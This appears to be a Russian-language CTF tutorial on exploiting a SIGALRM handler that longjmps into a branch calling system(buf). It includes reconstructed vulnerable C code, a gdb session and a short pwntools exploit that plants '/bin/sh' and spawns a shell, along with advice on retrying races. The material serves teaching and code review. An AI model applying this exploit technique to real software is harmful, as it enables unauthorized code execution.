## Вопрос, с которого всё начинается

Программа проверила пароль и только потом выдала доступ. Логика линейна и кажется надёжной. Но если в программе есть обработчик сигнала, эта линейность рушится: сигнал может прийти в **произвольный** момент, и обработчик способен увести исполнение в совсем другую точку. Разберём, как это превращается в эксплуатируемую уязвимость.

## Наш пример: бинарь chall

Нам дали бинарь, который ставит таймер и читает ввод. Смотрим, какие функции он использует:

```
$ objdump -d ./chall | grep -E "signal@plt|_setjmp@plt|longjmp@plt|alarm@plt"
0000000000401040 <alarm@plt>:
0000000000401060 <_setjmp@plt>:
0000000000401070 <signal@plt>:
0000000000401080 <longjmp@plt>:
  401190:  call  401080 <longjmp@plt>
  4011aa:  call  401060 <_setjmp@plt>
  4011c2:  call  401070 <signal@plt>
  4011cc:  call  401040 <alarm@plt>
```

Видим сразу четыре знакомых имени. `signal` регистрирует обработчик сигнала, `alarm` заводит таймер, `_setjmp`/`longjmp` — механизм «сохранить точку и прыгнуть в неё позже». Уже понятно, что программа полагается на сигнал. Восстановим логику по дизассемблеру:

```c
static char jb[256];
void handler(int sig) { longjmp(jb, 1); }        // обработчик SIGALRM

void vuln(void) {
    char buf[64];
    if (_setjmp(jb) == 0) {                      // 0 — «первый заход»
        signal(14, handler);                     // SIGALRM = 14
        alarm(1);                                // сигнал через 1 секунду
        read(0, buf, 256);                       // buf всего 64 — переполнение
        pause();                                 // ждём сигнал
    } else {
        system(buf);                             // сюда прыгает longjmp
    }
}
```

Разбираем: `_setjmp(jb)` сохраняет текущее состояние (стек, регистры) в буфер `jb` и возвращает `0`. `signal(14, handler)` говорит ядру: «при SIGALRM вызови `handler`». `alarm(1)` просит доставить SIGALRM через секунду. Дальше `read` читает ввод в `buf`, а `pause` усыпляет программу до сигнала. Когда сигнал приходит, `handler` делает `longjmp(jb, 1)` — управление возвращается в `_setjmp`, который теперь вернёт `1`, и исполнение уходит в ветку `else`, где вызывается `system(buf)`.

## Почему сигналы ломают линейность

Сигнал — это асинхронное уведомление: ядро прерывает поток в **любой** инструкции и передаёт управление обработчику. Из этого следуют два правила, которые новичок часто не замечает:

- **Состояние может быть частично обновлено.** Обработчик видит данные «в середине» операции.
- **Обработчик должен быть async-signal-safe.** POSIX разрешает из обработчика лишь узкий список функций (`read`, `write`, `_exit`, `kill`). Всё остальное — `malloc`, `free`, `printf`, `system` — небезопасно: сигнал может прервать эти функции прямо на внутреннем lock, и повторный вход сломает структуры.

`longjmp` из обработчика — отдельная головная боль: он **обходит** нормальный путь завершения и cleanup, перенося управление в сохранённую точку. Именно это и эксплуатируется: прыжок в `else` происходит тогда, когда `buf` уже под нашим контролем.

Отдельно стоит помнить про `errno`. Обработчик сигнала обязан сохранять и восстанавливать это значение, иначе «протечёт» в основной поток и сломает логику. Такого рода ошибки часто выглядят безобидно, но приводят к неочевидным багам, которые и эксплуатируют как логические уязвимости. Ещё один тонкий момент — общие статические буферы. Если обработчик и основной код используют один и тот же глобальный буфер (например, возвращаемый `strerror` или `inet_ntoa`), сигнал в середине заполнения оставит буфер в неконсистентном состоянии. Ищите глобальные буферы, к которым обращаются и обработчик, и основной код, — это верный признак уязвимости.

Сигналы часто сочетаются с файловыми операциями. Классический сценарий: обработчик по таймеру закрывает или переоткрывает файл, а основной поток в это же время читает из него. Между проверкой (`fstat`) и использованием (`read`) дескриптор подменяется — это TOCTOU (time-of-check to time-of-use) в чистом виде. Если программа работает от повышенных привилегий, такая гонка может позволить прочитать недоступный пользователю файл.

## Приём: выиграть гонку

Наша цель — чтобы к моменту `longjmp` в `buf` лежала строка `/bin/sh`. Тогда ветка `else` вызовет `system("/bin/sh")` и даст оболочку.

Порядок такой: отправляем строку в `read`, но так, чтобы программа **не вышла** из блока до сигнала. После `read` стоит `pause()` — он ждёт сигнал, не трогая `buf`. Значит, достаточно:

1. Отправить `"/bin/sh\x00"` — `read` заберёт эти байты в `buf`.
2. Подождать секунду, пока `alarm` доставит SIGALRM.
3. `handler` делает `longjmp` в `else`, где `buf` уже равен `/bin/sh`.

Посмотреть, где именно приходит сигнал, удобно в отладчике. Команда `handle SIGALRM stop print` заставляет gdb остановиться на доставке сигнала:

```
$ gdb -q ./chall
(gdb) handle SIGALRM stop print
(gdb) run < in.bin
Program received signal SIGALRM, Alarm clock.
(gdb) bt
#0  0x00007ffff7e283be in ?? () from /usr/lib/libc.so.6
#1  0x00007ffff7e283e4 in ?? () from /usr/lib/libc.so.6
#2  0x00007ffff7e84e61 in pause () from /usr/lib/libc.so.6
#3  0x00000000004011fc in vuln ()
#4  0x0000000000401216 in main ()
```

Стек подтверждает план: сигнал прервал `pause()` внутри `vuln`, и сейчас `handler` сделает `longjmp`.

## Полный прогон

```python
from pwn import *
p = process('./chall')
p.send(b'/bin/sh\x00')       # buf = "/bin/sh"; pause() ждёт сигнал
time.sleep(1.5)              # SIGALRM -> longjmp -> system(buf)
p.sendline(b'echo RACE_WON; id')
print(p.recvall(timeout=3).decode())
```

Запускаем:

```
$ python3 exploit.py
RACE_WON
uid=1000(user) gid=1000(user) groups=1000(user)
```

Гонка выиграна. Обработчик сигнала сделал `longjmp` в ветку `else`, и `system("/bin/sh")` запустил оболочку — при том, что нормальный путь исполнения до этой ветки не доходил.

## Если не сработало

- **Окно слишком узкое.** Оберни эксплойт в цикл: `for _ in range(500): …` — гонки редко срабатывают с первого раза.
- **`SA_RESTART` мешает.** С этим флагом прерванный `read` перезапускается, а не возвращает `EINTR`. Проверь, как установлен обработчик.
- **`volatile sig_atomic_t`.** Если общий флаг не объявлен `volatile`, компилятор кэширует его значение и «гонка» не воспроизводится.
- **`sigprocmask`.** Маскирование сигнала в критической секции закрывает окно.
- **Слишком быстрый эксплойт.** Иногда нужно намеренно замедлить отправку, чтобы сигнал успел доставиться.

## Что мы теперь знаем

- Сигнал прерывает поток в произвольной точке — линейность ломается.
- Обработчик должен быть async-signal-safe; `malloc`/`printf` внутри него опасны.
- `longjmp` из обработчика обходит нормальный путь и cleanup.
- Управляя буфером до доставки сигнала, можно заставить ветку «восстановления» выполнить наш код.
- gdb с `handle SIGALRM stop print` показывает, где именно прерван поток.

## На что смотреть дальше

- **Есть ли `longjmp`/`setjmp`.** Это главный признак такой уязвимости.
- **Что делает ветка «восстановления».** Часто там как раз опасный вызов.
- **Момент доставки сигнала.** Что уже записано в буфер к этому времени.
- **Async-signal-safety.** Небезопасные функции в обработчике — источник re-entrancy.
- **Стабильность.** Гонки недетерминированы; планируй повторные попытки.

## Куда дальше

Мы закончили сигнальную ветку. В `pwn-race-conditions` и `pwn-race-widening` гонки разбираются шире — в том числе как детерминированно расширять окно через `userfaultfd`. А пока главное: **обработчик сигнала, делающий `longjmp`, может увести исполнение в точку, где буфер уже под нашим контролем.**

## Где пригодится

- **CTF:** задачи с таймерами, `SIGALRM` и `setjmp`.
- **Bug bounty:** гонки в демонах, обрабатывающих сигналы.
- **Пентест:** эксплуатация нестабильных уязвимостей.
- **Работа:** code review async-signal-safety и конкурентного кода.
